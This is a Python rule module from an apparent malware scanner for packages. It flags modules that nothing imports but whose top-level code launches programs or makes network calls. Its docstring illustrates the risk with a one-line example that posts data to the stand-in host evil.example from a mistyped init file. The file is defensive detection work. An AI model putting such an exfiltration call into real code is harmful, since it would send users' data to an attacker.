"""A module nothing imports whose top-level code starts programs or uses the network.

Plenty of honest packages ship scripts like this, run only when someone runs them:
a Streamlit app, a launcher, a CLI tool. But so does malware, when its payload
waits for the user to run it, or when the author got the import wrong:

    # bytedtrace/__init__py.py   (a typo for __init__.py: imported by nothing)
    requests.post("https://evil.example", data=...)

So it's medium: not enough on its own, but it adds up with other signs, like a
brand-new package with no links. Code under `if __name__ == "__main__":` isn't
counted, since CLI tools put their work there.

The other half of import_time_code: together they check every module of the
package, once.
"""

from __future__ import annotations

from crotalus.models import AnalysisContext, Finding
from crotalus.rules.helpers.import_graph import (
    import_time_calls,
    installed_package_code,
    modules_run_on_import,
)
from crotalus.rules.helpers.static_code_analysis import (
    calls_evidence,
    describe_calls,
    process_and_network_calls,
)


def check(context: AnalysisContext) -> list[Finding]:
    package_code = installed_package_code(context)
    if package_code is None:
        return []
    archive_name, files = package_code

    run_on_import = modules_run_on_import(files)
    found = process_and_network_calls(
        {path: source for path, source in files.items() if path not in run_on_import},
        import_time_calls,
    )
    if not found.calls:
        return []
    return [
        Finding(
            rule_id="unimported_script_code",
            severity="medium",
            message=(
                f"a module nothing imports {describe_calls(found)} when run"
                f" ({', '.join(found.files[:3])})"
            ),
            evidence=calls_evidence(found, archive_name),
        )
    ]
